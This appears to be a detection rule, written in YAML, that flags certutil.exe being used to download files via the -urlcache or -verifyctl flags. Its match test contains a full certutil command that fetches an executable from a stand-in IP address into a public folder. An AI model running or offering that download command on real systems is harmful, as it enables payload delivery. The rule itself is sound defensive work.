id: LNT-016
title: Certutil used to download a file
severity: high
attack: [T1105]
description: >
  certutil.exe, a built-in certificate tool, was run with -urlcache or
  -verifyctl, which can fetch files from a URL. Attackers use it to download
  payloads with a signed Microsoft binary.
detection:
  certutil:
    - Image|endswith: '\certutil.exe'
    - NewProcessName|endswith: '\certutil.exe'
  download_flags:
    CommandLine|contains: [urlcache, verifyctl]
  condition: certutil and download_flags
fields: [User, SubjectUserName, ParentImage, CommandLine]
falsepositives:
  - Rare; some admins clear the URL cache with -urlcache * delete
references:
  - https://attack.mitre.org/techniques/T1105/
tests:
  match:
    - EventID: 1
      Image: C:\Windows\System32\certutil.exe
      CommandLine: certutil.exe -urlcache -split -f http://198.51.100.23/inv.exe C:\Users\Public\inv.exe
  nomatch:
    - EventID: 1
      Image: C:\Windows\System32\certutil.exe
      CommandLine: certutil.exe -hashfile report.pdf SHA256
